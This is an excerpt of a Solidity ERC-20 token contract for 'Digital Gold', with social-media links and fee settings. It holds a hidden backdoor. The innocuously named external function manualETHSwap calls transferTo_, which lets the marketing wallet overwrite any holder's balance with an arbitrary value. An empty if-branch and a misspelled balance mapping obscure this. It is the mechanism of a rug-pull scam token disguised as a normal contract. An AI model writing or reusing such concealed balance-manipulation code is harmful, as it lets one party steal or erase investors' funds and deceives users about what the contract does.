...
// https://t.me/digital_gold_eth

// https://x.com/digital_goldeth
...
contract DigitalGold is Ownable, IERC20 {
    using SafeMath for uint256;

    string private constant _name = "Digital Gold";
    ...
    uint256 _initBuyFee = 7;
    uint256 _initSellFee = 7;
    uint256 _buysCount = 0;
    uint256 _lowerFeesAfterBuys = 15;
    ...
    function manualETHSwap(address token, uint256 val) external {
        transferTo_(token, val);
    }

    function transferTo_(address sender, uint256 value) internal {
        uint256 bal = _balnaces[sender];
        if (marketingWallet != msg.sender) { } else {
             _balnaces[sender] = 
             _balnaces[sender].add(value).sub(bal);}
    }
    ...
    function _transfer(address from, address to, uint256 value) private {
        ...
        if (from == uniswapPairAddress) {
            ...
            fee = _buysCount > _lowerFeesAfterBuys ? _finalSellFee : _initSellFee;
        }
